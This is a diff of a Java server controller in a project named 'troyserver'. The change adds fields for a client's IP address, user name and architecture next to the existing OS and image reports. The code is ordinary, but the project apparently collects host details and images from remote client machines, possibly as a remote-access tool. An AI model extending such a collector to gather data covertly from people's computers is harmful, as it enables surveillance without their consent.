@@ -1,10 +1,10 @@
 package ch.lebois.troyserver.controller;
 
 import ch.lebois.troyserver.data.entity.Client;
-import ch.lebois.troyserver.data.repository.ClientRepository;
 import ch.lebois.troyserver.data.entity.Image;
-import ch.lebois.troyserver.data.repository.ImageRepository;
 import ch.lebois.troyserver.data.entity.Message;
+import ch.lebois.troyserver.data.repository.ClientRepository;
+import ch.lebois.troyserver.data.repository.ImageRepository;
 import ch.lebois.troyserver.data.repository.MessageRepository;
 import ch.lebois.troyserver.service.ImageService;
 import java.text.SimpleDateFormat;
@@ -48,6 +48,15 @@ public class ServerReceiverController {
             case "os":
                 client.setOs(valueParam);
                 break;
+            case "ip":
+                client.setIp(valueParam);
+                break;
+            case "user":
+                client.setPcuser(valueParam);
+                break;
+            case "arch":
+                client.setArch(valueParam);
+                break;
             case "online":
                 break;
             case "img":
@@ -75,6 +84,7 @@ public class ServerReceiverController {
         if (client == null) {
             client = new Client();
             client.setPcName(clientParam);
+            client.setInfo("");
             clientRepository.save(client);
         }
 
